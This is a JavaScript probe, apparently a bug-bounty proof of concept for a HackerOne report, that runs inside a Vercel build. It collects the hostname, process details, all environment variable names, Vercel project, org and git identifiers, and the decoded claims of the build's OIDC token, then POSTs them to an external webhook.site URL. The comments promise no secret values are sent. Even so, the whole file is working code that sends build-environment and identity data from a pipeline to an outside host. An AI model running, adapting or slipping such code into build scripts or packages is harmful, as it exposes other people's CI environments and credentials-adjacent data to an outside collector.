// Build-environment forensic probe for HackerOne report #4086036.
// Determines whether the execution happens inside a Vercel build container
// or on a local machine, and what the environment exposes.
// Only variable NAMES and OIDC claim metadata are sent — never secret values.
import os from "node:os";

const WEBHOOK = "https://webhook.site/a72ec3e3-e006-423e-bf2d-333bccfc0392";

function decodeClaims(token) {
  try {
    const part = token.split(".")[1];
    return JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
  } catch {
    return null;
  }
}

const names = Object.keys(process.env).sort();
const token = process.env.VERCEL_OIDC_TOKEN ?? "NOT_AVAILABLE";

const report = {
  phase: "build-forensics",
  // --- where am I running? ---
  runtime: {
    hostname: os.hostname(),
    platform: process.platform,
    arch: process.arch,
    node: process.version,
    cwd: process.cwd(),
    pid: process.pid,
    isVercelContainer:
      process.env.VERCEL === "1" ||
      process.cwd().startsWith("/vercel") ||
      os.hostname().length === 12 // vercel build hosts are short hex ids
  },
  // --- what does the environment expose? ---
  envVarCount: names.length,
  envVarNames: names,
  marker: {
    VERCEL: process.env.VERCEL ?? "NOT_SET",
    VERCEL_ENV: process.env.VERCEL_ENV ?? "NOT_SET",
    VERCEL_TARGET_ENV: process.env.VERCEL_TARGET_ENV ?? "NOT_SET",
    VERCEL_PROJECT_ID: process.env.VERCEL_PROJECT_ID ?? "NOT_SET",
    VERCEL_ORG_ID: process.env.VERCEL_ORG_ID ?? "NOT_SET",
    VERCEL_GIT_COMMIT_REF: process.env.VERCEL_GIT_COMMIT_REF ?? "NOT_SET",
    VERCEL_GIT_REPO_OWNER: process.env.VERCEL_GIT_REPO_OWNER ?? "NOT_SET",
    VERCEL_GIT_PULL_REQUEST_ID: process.env.VERCEL_GIT_PULL_REQUEST_ID ?? "NOT_SET",
    CI: process.env.CI ?? "NOT_SET"
  },
  oidc: {
    present: token !== "NOT_AVAILABLE",
    length: token === "NOT_AVAILABLE" ? 0 : token.length,
    claims: token === "NOT_AVAILABLE" ? null : decodeClaims(token)
  },
  timestamp: new Date().toISOString()
};

// Names / markers only — no secret values are sent or logged.
console.log("=== OIDC BUILD FORENSICS (HackerOne 4086036) ===");
console.log(JSON.stringify(report, null, 2));
console.log("=== END PROBE ===");

try {
  const response = await fetch(WEBHOOK, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(report),
    signal: AbortSignal.timeout(10_000)
  });
  console.log("probe post status:", response.status);
} catch (error) {
  console.log("probe post failed:", String(error));
}
